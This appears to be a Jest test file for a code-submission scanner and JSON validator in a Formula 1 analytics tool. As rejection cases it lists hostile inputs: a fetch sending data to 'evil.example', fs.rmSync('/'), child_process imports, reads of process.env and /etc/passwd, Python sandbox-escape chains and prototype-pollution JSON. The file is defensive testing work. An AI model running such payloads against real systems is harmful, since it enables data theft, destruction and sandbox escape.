import {
  validateFileUpload, scanForMaliciousCode, scanPythonCode, checkSubmissionCode, validateJsonBatch,
  MAX_FILE_BYTES, MAX_JSON_BYTES, MAX_JSON_DEPTH, MAX_REPORTED_FINDINGS,
} from './securityHelpers';

const valid = { isValid: true, error: null };
const validCode = { isValid: true, error: null, findings: [] };
const file = (overrides = {}) => ({ name: 'batch.json', type: 'application/json', size: 100, ...overrides });

test('file metadata is strict, case insensitive and size bounded', () => {
  expect(validateFileUpload(file({ size: MAX_FILE_BYTES }), '.json')).toEqual(valid);
  expect(validateFileUpload(file({ name: 'BATCH.JSON' }), 'json')).toEqual(valid);
  for (const overrides of [
    { name: 'batch.json.c' }, { name: 'batch.json ' }, { name: '../batch.json' },
    { type: 'text/x-c' }, { type: '' }, { type: 'text/plain' },
    { size: MAX_FILE_BYTES + 1 }, { size: NaN }, { size: -1 }, { size: 0 },
  ]) expect(validateFileUpload(file(overrides), '.json').isValid).toBe(false);
  expect(validateFileUpload(file(), '__proto__').isValid).toBe(false);
  expect(validateFileUpload(null, '.json').isValid).toBe(false);
});

describe('JavaScript', () => {
  test.each([
    // Execution, modules, process, network, browser data, timers.
    'eval("x")', '(0, eval)("x")', 'eval?.("x")', 'new Function("return 1")',
    "const fs = require('fs'); fs.rmSync('/');", 'require("node:child_process")',
    "import fs from 'fs';", "const m = await import('node:child_' + 'process');", 'import.meta.url',
    "export * from 'fs';", "export { readFile } from 'fs';",
    'console.log(process.env.DATABASE_URL);', 'Buffer.from("x")',
    "fetch('https://evil.example/?d=1');", 'new XMLHttpRequest()', 'new WebSocket("wss://x")',
    'document.cookie', 'window /* comment */ . location', 'localStorage.getItem("token")', 'globalThis.x',
    "setTimeout('alert(1)', 0);", 'Reflect.apply(Math.max, null, [1])', 'new Proxy({}, {})',
    // Ways to reach the Function constructor or prototypes.
    '[].constructor.constructor("return 1")()', 'const a = []; a["constructor"];',
    "const a = []; a['con' + 'structor'];", 'const a = [], k = "x"; a[`${k}y`];',
    'Object.getPrototypeOf(async () => {})', 'const o = { __proto__: null };', 'String.fromCharCode(101)',
    // Escapes are decoded by the parser, so they don't hide names.
    'e\\u0076al("x")', 'window["\\x65val"]("x")',
    // A parameter called `process` doesn't make the global one available.
    'function f(process) { return process; }\nprocess.exit(1);',
    // Undeclared names, including writes that would create globals.
    'leak = 1;', 'char *buffer;',
    // Not JavaScript at all.
    '#include <stdio.h>', 'int main(void) { return 0; }', 'void main() {}', 'def f(x):\n    return x',
  ])('rejects %s', (source) => {
    const result = scanForMaliciousCode(source);
    expect(result.isValid).toBe(false);
    expect(result.findings.length).toBeGreaterThan(0);
  });

  test.each([
    // The form's own example.
    'export function tyreDelta(stint) {\n  return (stint.lastLapTime - stint.firstLapTime) / stint.lapCount;\n}',
    // A local variable named like a browser global (OpenF1 car location data).
    'export function track(samples) { const location = samples.map((s) => [s.x, s.y]); return location; }',
    // Classes with constructors and getters.
    'export class Stint { constructor(laps) { this.laps = laps; } get count() { return this.laps.length; } }',
    // Blocked words inside comments and strings are only text.
    "// the long run on hards; eval, require('fs') and process.env\nexport const label = 'double stack, short stint';",
    // Unicode escapes in strings.
    "export const driver = 'S\\u00e9rgio P\\u00e9rez';",
    // Destructuring, defaults, rest, loops, labels, try/catch, closures.
    'export default function ({ laps = [], pits: [first, ...rest] }) {\n'
      + '  let total = 0;\n  for (const { time } of laps) total += time;\n'
      + '  outer: for (let i = 0; i < 2; i += 1) { if (i) continue outer; }\n'
      + '  try { JSON.parse("{}"); } catch (err) { console.warn(err.message); }\n'
      + '  const avg = (xs) => xs.reduce((a, b) => a + b, 0) / Math.max(1, xs.length);\n'
      + '  return { total, first, rest, mean: avg(laps.map((l) => l.time)), when: new Date(0).toISOString() };\n}',
    'export const isFn = (cb) => typeof cb === "function";',
    'export function byDriver(rows) { const out = new Map(); for (const row of rows) { const key = row["driver_number"]; out.set(key, (out.get(key) ?? 0) + 1); } return out; }',
  ])('allows ordinary analytics code %#', (source) => {
    expect(scanForMaliciousCode(source)).toEqual(validCode);
  });

  test('reports the line and the name, and lists only the first few in the message', () => {
    const result = scanForMaliciousCode('export const a = 1;\nconst x = require("fs");\nprocess.exit();\nfetch("/");\neval("1");');
    expect(result.findings.map((f) => f.line)).toEqual([2, 3, 4, 5]);
    expect(result.findings[0]).toMatchObject({ line: 2, column: 11, rule: 'global' });
    expect(result.error).toMatch(/^Line 2: `require` isn't available/);
    expect(result.error).toContain(`(and ${4 - MAX_REPORTED_FINDINGS} more)`);
  });

  test('a syntax error is reported with its line', () => {
    const result = scanForMaliciousCode('export const a = 1;\nconst = ;');
    expect(result.findings).toEqual([expect.objectContaining({ line: 2, rule: 'syntax' })]);
    expect(result.error).toMatch(/^Line 2: This isn't valid JavaScript/);
  });

  test('rejects empty, oversized and control-character input', () => {
    for (const value of [null, {}, '', ' ']) expect(scanForMaliciousCode(value).isValid).toBe(false);
    expect(scanForMaliciousCode(' '.repeat(MAX_FILE_BYTES + 1)).error).toBe('Code exceeds the 2 MiB limit.');
    expect(scanForMaliciousCode('const a = 1; /* \u202e */').findings[0].rule).toBe('control-character');
  });

  test('large inputs stay fast', () => {
    const started = Date.now();
    expect(scanForMaliciousCode('\n'.repeat(100000) + 'export const laps = [];')).toEqual(validCode);
    const rows = Array.from({ length: 2000 }, (_, i) => `  total += laps[${i}]?.time ?? 0; // lap ${i}`).join('\n');
    expect(scanForMaliciousCode(`export function sum(laps) {\n  let total = 0;\n${rows}\n  return total;\n}`)).toEqual(validCode);
    expect(Date.now() - started).toBeLessThan(5000);
  });

  test('extreme nesting is rejected, never thrown', () => {
    for (const source of ['export const a = ' + '['.repeat(20000) + ']'.repeat(20000) + ';', 'export const t = ' + '1 + '.repeat(20000) + '1;']) {
      const result = scanForMaliciousCode(source);
      expect(result.isValid).toBe(false);
    }
  });
});

describe('Python', () => {
  test.each([
    "import os\nos.system('ls')", 'import sys', 'import math, subprocess', 'import os.path as p',
    'from subprocess import run', 'from . import secrets', 'import pandas as pd',
    "x = eval('1+1')", "exec('print(1)')", "data = open('/etc/passwd').read()", "__import__('os')",
    "getattr(obj, 'x')", 'breakpoint()',
    '().__class__.__bases__[0].__subclasses__()', 'f.__globals__', 'print(__builtins__)',
    // f-string expressions run, so they are checked too.
    "s = f\"{eval('1')}\"",
    "x = 'never closed",
  ])('rejects %s', (source) => {
    expect(scanPythonCode(source).isValid).toBe(false);
  });

  test.each([
    'import statistics, math\nfrom collections import defaultdict\nfrom datetime import timedelta\n\n'
      + 'def tyre_delta(laps):\n    # eval() and import os in a comment are only text\n'
      + "    note = 'open the pit window, exec the plan'\n    doc = \"\"\"Uses __class__ in a docstring.\"\"\"\n"
      + "    return statistics.mean(lap['time'] for lap in laps)\n",
    'class Stint:\n    def __init__(self, laps):\n        self.laps = laps\n\n    def __len__(self):\n        return len(self.laps)\n\n'
      + "if __name__ == '__main__':\n    print(len(Stint([1, 2])))\n",
    "def f(df):\n    return df.eval('a + b')\n",
    "label = f'{driver} on lap {lap}'\n",
    "path = r'C:\\\\laps\\\\'\n",
  ])('allows ordinary analytics code %#', (source) => {
    expect(scanPythonCode(source)).toEqual(validCode);
  });

  test('reports the line of each problem', () => {
    const result = scanPythonCode('import math\n\nimport os\nx = eval("1")');
    expect(result.findings.map((f) => [f.line, f.rule])).toEqual([[3, 'import'], [4, 'builtin']]);
    expect(result.error).toMatch(/^Line 3: Importing `os` isn't allowed/);
  });
});

test('checkSubmissionCode picks the check for the language', () => {
  expect(checkSubmissionCode('JavaScript', 'eval("x")').isValid).toBe(false);
  expect(checkSubmissionCode('JavaScript', 'export const a = 1;')).toEqual(validCode);
  expect(checkSubmissionCode('Python', 'import os').isValid).toBe(false);
  expect(checkSubmissionCode('Python', 'import math')).toEqual(validCode);
  expect(checkSubmissionCode('C', 'int main() {}').isValid).toBe(false);
});

test('JSON uses UTF-8 byte limits including astral characters', () => {
  expect(validateJsonBatch('["' + 'a'.repeat(MAX_JSON_BYTES - 4) + '"]')).toEqual(valid);
  expect(validateJsonBatch('["' + 'a'.repeat(MAX_JSON_BYTES - 3) + '"]').isValid).toBe(false);
  expect(validateJsonBatch('["' + '😀'.repeat(MAX_JSON_BYTES / 4) + '"]').isValid).toBe(false);
});

test('nesting is bounded before parse and ignores string contents', () => {
  expect(validateJsonBatch('['.repeat(MAX_JSON_DEPTH) + '0' + ']'.repeat(MAX_JSON_DEPTH))).toEqual(valid);
  expect(validateJsonBatch('['.repeat(MAX_JSON_DEPTH + 1) + '0' + ']'.repeat(MAX_JSON_DEPTH + 1)).isValid).toBe(false);
  expect(validateJsonBatch(JSON.stringify({ text: '[{'.repeat(100) + '\\"' }))).toEqual(valid);
});

test.each(['{"__proto__":{}}', '{"nested":[{"constructor":{}}]}', '{"prototype":1}', '{"\\u005f_proto__":{}}', '{', '[1,]', 'null', '1', '"text"'])('rejects unsafe JSON: %s', (input) => {
  expect(validateJsonBatch(input).isValid).toBe(false);
});

test('normal object and array batches pass', () => {
  expect(validateJsonBatch('{"laps":[{"lap":1}]}')).toEqual(valid);
  expect(validateJsonBatch('[]')).toEqual(valid);
  expect(validateJsonBatch({}).isValid).toBe(false);
});
